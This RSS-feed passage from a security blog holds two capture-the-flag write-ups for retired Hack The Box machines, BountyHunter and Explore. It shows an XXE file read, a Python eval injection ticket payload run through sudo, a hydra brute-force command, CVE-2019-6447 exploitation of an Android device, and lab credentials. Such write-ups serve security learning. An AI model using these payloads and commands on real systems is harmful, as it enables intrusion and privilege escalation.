<code>/tracker_diRbPr00f314.php</code> page displays the submitted data, and also an interesting message: &quot;If DB were ready, would have added: [...]&quot; - this lets us know that <strong>the DB is not yet configured</strong>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-12-at-21.40.16.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy" width="599" height="174"></figure><p>Since the data is sent via <code>XML</code> I wanted to see if I could manipulate this payload in a way that achieves <code>LFI</code> using <code>XXE</code>. As always, I created a Python script to help me test ideas out:</p><!--kg-card-begin: html--><script src="https://gist.github.com/inesmartins/582a499b67c4a0c4d7507b0e0cb735de.js"></script><!--kg-card-end: html--><p>Turns out, the application <em>is</em> vulnerable to <code>XXE</code> - as an example we can see the output of the <code>/etc/passwd</code> file:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-18-at-13.22.35.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><hr><h2 id="lfi-to-rce">LFI to RCE</h2><p>After running this script with a few different <a href="https://github.com/danielmiessler/SecLists">SecLists</a> (and creating some lists of my own), I was able to get the exact Linux version:</p><pre><code class="language-prettyprint lang-sh">Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021</code></pre><p>... as well as the most interesting users:</p><pre><code class="language-prettyprint lang-sh"># /etc/passwd
...
root:x:0:0:root:/root:/bin/bash
development:x:1000:1000:Development:/home/development:/bin/bash
...</code></pre><p>After changing the script to use <code>php://filter/read=convert.base64-encode/resource=</code> instead of <code>file://</code> for files ending in <code>.php</code>, I also had access to all of the project&apos;s files, including the DB:</p><pre><code class="language-prettyprint lang-sh">~ python3 xxe-script.py -url http://10.10.11.100/tracker_diRbPr00f314.php -pathlist wordlists/custom-finding-webserver-files.txt
Checking /var/www/html/db.php
	File contains data!
Checking /var/www/html/index.php
	File contains data!
Checking /var/www/html/portal.php
	File contains data!
Checking /var/www/html/log_submit.php
	File contains data!
Checking /var/www/html/tracker_diRbPr00f314.php
	File contains data!
Checking /var/www/html/resources/README.txt
	File contains data!
Checking /var/www/html/resources/lato.css
	File contains data!
Checking /var/www/html/resources/monsterat.css
	File contains data!
Checking /var/www/html/resources/all.js
Checking /var/www/html/resources/bootstrap.bundle.min.js
Checking /var/www/html/resources/bootstrap_login.min.js
Checking /var/www/html/resources/bountylog.js
Checking /var/www/html/resources/jquery.easing.min.js
Checking /var/www/html/resources/jquery.min.js
Checking /var/www/html/resources/jquery_login.min.js</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/09/Screenshot-2021-09-18-at-18.38.19.png" class="kg-image" alt="HTB Write-up | BountyHunter" loading="lazy"></figure><p>Luckily for us, someone used the same creds for the DB and <code>SSH</code> access, so I got a shell:</p><pre><code class="language-prettyprint lang-sh">~ ssh development@10.10.11.100
&gt; m19RoAU0hP41A1sTsq6K</code></pre><hr><h2 id="r00ting">R00ting</h2><p>Once in the user&apos;s <code>/home</code> directory, I could see a message from John to other developers:</p><pre><code class="language-prettyprint lang-sh">~ ls -la
lrwxrwxrwx 1 root        root           9 Apr  5 22:53 .bash_history -&gt; /dev/null
-rw-r--r-- 1 development development  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 development development 3771 Feb 25  2020 .bashrc
drwx------ 2 development development 4096 Apr  5 22:50 .cache
lrwxrwxrwx 1 root        root           9 Jul  5 05:46 .lesshst -&gt; /dev/null
drwxrwxr-x 3 development development 4096 Apr  6 23:34 .local
-rw-r--r-- 1 development development  807 Feb 25  2020 .profile
drwx------ 2 development development 4096 Apr  7 01:48 .ssh
-rw-r--r-- 1 root        root         471 Jun 15 16:10 contract.txt
-r--r----- 1 root        development   33 Sep 19 06:18 user.txt</code></pre><pre><code class="language-prettyprint lang-sh">$ cat contract.txt
Hey team,

I&apos;ll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the &quot;rm -rf&quot; incident and we can&apos;t mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John</code></pre><p>John seems to be referring to some &quot;internal tool&quot; sent by &quot;Skytrain Inc&quot;, so I tried to find any other reference to this company. Under <code>/opt</code> I got some interesting matches:</p><pre><code class="language-prettyprint lang-sh">$ grep -Rils &apos;Skytrain&apos; /opt

/opt/skytrain_inc/ticketValidator.py
/opt/skytrain_inc/invalid_tickets/390681613.md
/opt/skytrain_inc/invalid_tickets/734485704.md
/opt/skytrain_inc/invalid_tickets/529582686.md
/opt/skytrain_inc/invalid_tickets/600939065.md</code></pre><p>The <code>ticketValidator.py</code> seems interesting:</p><pre><code class="language-prettyprint lang-sh">~ ls -la /opt/skytrain_inc/ticketValidator.py
-r-xr--r-- 1 root root 1471 Jul 22 11:08 /opt/skytrain_inc/ticketValidator.py</code></pre><p>When we run it using some of the tickets in the same directory, we see that these tickets are invalid:</p><pre><code class="language-prettyprint lang-sh">$ python3 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/opt/skytrain_inc/invalid_tickets/390681613.md
Destination: New Haven
Invalid ticket.

$ python3 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/opt/skytrain_inc/invalid_tickets/734485704.md
Destination: Bridgeport
Invalid ticket.</code></pre><p>Let&apos;s take a closer look at the script to see if we&apos;re able to abuse it:</p><pre><code class="language-pythonprettyprint lang-python">#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(&quot;.md&quot;):
        return open(loc, &apos;r&apos;)
    else:
        print(&quot;Wrong file type.&quot;)
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith(&quot;# Skytrain Inc&quot;):
                return False
            continue
        if i == 1:
            if not x.startswith(&quot;## Ticket to &quot;):
                return False
            print(f&quot;Destination: {&apos; &apos;.join(x.strip().split(&apos; &apos;)[3:])}&quot;)
            continue

        if x.startswith(&quot;__Ticket Code:__&quot;):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith(&quot;**&quot;):
                return False
            ticketCode = x.replace(&quot;**&quot;, &quot;&quot;).split(&quot;+&quot;)[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace(&quot;**&quot;, &quot;&quot;))
                if validationNumber &gt; 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input(&quot;Please enter the path to the ticket file.\n&quot;)
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print(&quot;Valid ticket.&quot;)
    else:
        print(&quot;Invalid ticket.&quot;)
    ticket.close

main()
</code></pre><p>After some local tests I was able to create a valid payload, but I was still unable to get the root flag, due to a &quot;Permission denied&quot; exception:</p><pre><code class="language-prettyprint lang-sh"># Skytrain Inc
## Ticket to Bridgeport
__Ticket Code:__
**18 + __import__(&apos;os&apos;).system(&apos;cat /root/root.txt&apos;)**
##Issued: 2021/06/21
#End Ticket</code></pre><p>After using <code>linpeas.sh</code> I realised that I was able to execute a very specific command as <code>sudo</code>:</p><pre><code class="language-prettyprint lang-sh">User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py</code></pre><p>Using this privileged command, I was able to get the flag:</p><pre><code class="language-prettyprint lang-sh">$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
/tmp/malicious.md
Destination: Bridgeport
c70cb6e9f9e9a923d6718090a3f74d33
Invalid ticket.</code></pre><hr><h2 id="references">References</h2><ul><li><a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li><li><a href="https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2">https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-2</a></li><li><a href="https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/">https://resources.infosecinstitute.com/topic/local-file-inclusion-code-execution/</a></li></ul>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Explore]]></title><description><![CDATA[<p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</em></p><hr><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:</code></pre>]]></description><link>inesmartins.github.io/htb-write-up-explore/</link><guid isPermaLink="false">60df5ec80bafc20a7e3c4b50</guid><category><![CDATA[android]]></category><category><![CDATA[htb]]></category><category><![CDATA[ssh]]></category><category><![CDATA[adb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sat, 30 Oct 2021 19:10:00 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.59.58.png" alt="HTB Write-up | Explore"><p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/356">here</a>.</em></p><hr><h2 id="esketit"><a href="https://www.urbandictionary.com/define.php?term=esketit">esketit</a></h2><p>Let&apos;s start with some basic scanning:</p><pre><code>~ nmap -A 10.10.10.247

PORT     STATE    SERVICE    VERSION
2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv</code></pre><p>On Android, the <code>5555</code> TCP port is usually open when the <a href="https://developer.android.com/studio/command-line/adb">Android Debug Bridge</a> Daemon (ADBD) is running, however, in this case the port is filtered.</p><p>Let&apos;s focus on the other port: the <code>SSH</code> Server application from &quot;Banana Studio&quot; is &#xA0;<a href="https://play.google.com/store/apps/details?id=net.xnano.android.sshserver.tv">available on Play Store</a> and, as you can see below, supports anonymous login (&quot;username=<code>ssh</code> without any password&quot;):</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/07/Screenshot-2021-07-11-at-16.23.28.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="534" height="102"></figure><p>However, it seems like this anonymous login is disabled. I was also not able to brute-force the password using <a href="https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt">a relevant SecList</a>:</p><pre><code>~ hydra -l ssh -P ssh-passwords.txt -s 2222 -t 16 10.10.10.247 ssh</code></pre><p>Let&apos;s expand our scanning to see what else is open:</p><pre><code>~ nmap -p 1-65535 10.10.10.247

2222/tcp open     ssh     (protocol 2.0)
| fingerprint-strings: 
|   NULL: 
|_    SSH-2.0-SSH Server - Banana Studio
| ssh-hostkey: 
|_  2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)
5555/tcp filtered freeciv
59777/tcp open  http    Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older
|_http-title: Site doesn&apos;t have a title (text/plain).</code></pre><p>Nice, another port!</p><p>Doing a bit of Googling we come across <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6447">CVE-2019-6447</a>:</p><blockquote>The ES File Explorer File Manager application through 4.1.9.7.4 for Android allows remote attackers to read arbitrary files or execute applications via TCP port 59777 requests on the local Wi-Fi network. This TCP port remains open after the ES application has been launched once, and responds to unauthenticated application/json data over HTTP.</blockquote><p>In order to exploit this misconfiguration, we can use <a href="https://www.exploit-db.com/exploits/50070">this</a> exploit.</p><p>After some trial and error, and with a bit of luck, I came across the user flag:</p><pre><code>~ python3 50070.py getFile 10.10.10.247 /sdcard/user.txt 

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

[+] Downloading file...
[+] Done. Saved as `out.dat`.

~ htb_explore cat out.dat                                           
f32017174c7c7e8f50c6da52891ae250</code></pre><hr><h2 id="road-to-root">Road to root</h2><p>Let&apos;s continue enumerating using the other available commands for this script:</p><pre><code>~ python3 50070.py listPics 10.10.10.247

==================================================================
|    ES File Explorer Open Port Vulnerability : CVE-2019-6447    |
|                Coded By : Nehal a.k.a PwnerSec                 |
==================================================================

...
name : creds.jpg
time : 4/21/21 02:38:18 AM
location : /storage/emulated/0/DCIM/creds.jpg
size : 1.14 MB (1,200,401 Bytes)
...</code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png" class="kg-image" alt="HTB Write-up | Explore" loading="lazy" width="908" height="300" srcset="inesmartins.github.io/content/images/size/w600/2021/08/Screenshot-2021-08-01-at-15.28.01.png 600w, inesmartins.github.io/content/images/2021/08/Screenshot-2021-08-01-at-15.28.01.png 908w" sizes="(min-width: 720px) 720px"></figure><p>And we got a winner!</p><pre><code>~ ssh kristi@10.10.10.247 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Now that we have access to some <code>SSH</code> credentials, let&apos;s forward the traffic from the machine&apos;s <code>adb</code> service to a local port:</p><pre><code>~ adb start-server
* daemon not running; starting now at tcp:5037
* daemon started successfully

~ ssh -i ssh_key kristi@10.10.10.247 -L 5555:127.0.0.1:5555 -p 2222
&gt; Kr1sT!5h@Rp3xPl0r3!

$ whoami
u0_a76</code></pre><p>Then, on another tab on the local machine we can connect to the local service:</p><pre><code>~ adb connect 127.0.0.1:5555
connected to 127.0.0.1:5555

~ adb shell

$ whoami
shell</code></pre><p>Now let&apos;s see if we can authenticate as <code>root</code>:</p><pre><code>$ su - root

$ whoami
root

$ cd data      

$ ls
adb           bootchart     media       property       tombstones 
anr           cache         mediadrm    resource-cache user       
app           dalvik-cache  misc        root.txt       user_de    
app-asec      data          misc_ce     ss             vendor     
app-ephemeral drm           misc_de     ssh_starter.sh vendor_ce  
app-lib       es_starter.sh nfc         system         vendor_de  
app-private   local         ota         system_ce      
backup        lost+found    ota_package system_de      

$ cat root.txt
f04fc82b6d49b41c9b08982be59338c5</code></pre><p>Done :)</p>]]></content:encoded></item></channel></rss>